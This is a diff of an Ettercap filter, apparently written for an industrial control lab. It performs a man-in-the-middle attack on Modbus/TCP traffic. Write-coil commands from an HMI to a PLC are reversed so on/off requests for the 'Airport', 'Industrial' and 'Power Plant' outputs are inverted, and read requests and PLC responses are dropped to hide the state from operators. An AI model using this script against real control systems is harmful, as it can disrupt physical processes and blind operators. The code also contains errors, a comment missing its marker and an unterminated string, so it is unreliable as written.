@@ -10,19 +10,56 @@
 # License:     YC
 #-----------------------------------------------------------------------------
 
-# M10 -> Q0.0 Airport LED 
-if (ip.proto == TCP && tcp.src == 502) {
-    if (search(DATA.data ,"\x00\x00\x00\x04\x01\x01\x01\x00")) {
-        replace("\x00\x00\x00\x04\x01\x01\x01\x00", "\x00\x00\x00\x04\x01\x01\x01\x01");
-        msg("Man In The Middle Attack!\n");
+#Reverse the memory change signal from HMI to PLC.
+if (ip.proto == TCP  && tcp.dst == 502 && ip.dst == '192.168.10.72') {
+
+    # M10 -> Q0.0 Airport LED
+    if (search(DATA.data ,"\x0f\x00\x0a\x00\x01\x01\x00")) {
+        replace("\x0f\x00\x0a\x00\x01\x01\x00", "\x0f\x00\x0a\x00\x01\x01\x01");
+        msg("Reverse Airport LED off request.\n");
+    }
+    if (search(DATA.data ,"\x0f\x00\x0a\x00\x01\x01\x01")) {
+        replace("\x0f\x00\x0a\x00\x01\x01\x01", "\x0f\x00\x0a\x00\x01\x01\x00");
+        msg("Reverse Airport LED on request.\n");
+    }
+
+    # M60 -> Q0.2 Industrial LED
+    if (search(DATA.data ,"\x0f\x00\x3c\x00\x01\x01\x00")) {
+        replace("\x0f\x00\x3c\x00\x01\x01\x00", "\x0f\x00\x3c\x00\x01\x01\x01");
+        msg("Reverse Industrial LED off request.\n");
+    }
+
+    if (search(DATA.data ,"\x0f\x00\x3c\x00\x01\x01\x01")) {
+        replace("\x0f\x00\x3c\x00\x01\x01\x01", "\x0f\x00\x3c\x00\x01\x01\x00");
+        msg("Reverse Industrial LED off request.\n");
+    }
+
+    M0 -> Q0.1 Power Plant
+    if (search(DATA.data ,"\x0f\x00\x00\x00\x01\x01\x00")) {
+        replace("\x0f\x00\x00\x00\x01\x01\x00", "\x0f\x00\x00\x00\x01\x01\x01");
+        msg("Power Plant LED off request.\n");
+    }
+
+    if (search(DATA.data ,"\x0f\x00\x00\x00\x01\x01\x01")) {
+        replace("\x0f\x00\x00\x00\x01\x01\x01", "\x0f\x00\x00\x00\x01\x01\x00");
+        msg("Power Plant LED off request.\n");
     }
 }
 
+# Drop the memory change signal from HMI to PLC.
+if (ip.proto == TCP  && tcp.dst == 502 && ip.dst == '192.168.10.72')  {
+    # Drop the PLC response.
+    if (search(DATA.data ,"\x00\x00\x00\x00\x00\x08\x01\x01")) {
+        drop();
+        msg("Drop the read request!\n");
+    }
+}
 
-if (ip.proto == TCP && tcp.dst == 502 && ip.dst == '172.18.212.123') {
-    msg("IF 1!\n");
-    if (search(DATA.data ,"\x00\x06\x01\x01\x00\x00\x00\x01")) {
-        replace("\x06\x01\x01\x00\x00\x00\x01", "\x08\x01\x0f\x00\x00\x00\x01\x01\x00");
-        msg("turn off  Attack!\n");
+#Reverse the PLC response to HMI.
+if (ip.proto == TCP && tcp.dst == 502 && ip.dst == '192.168.10.21') {
+    # Drop the PLC response.
+    if (search(DATA.data ,"\x01\x08\")) {
+        drop();
+        msg("Drop the response!\n");
     }
 }
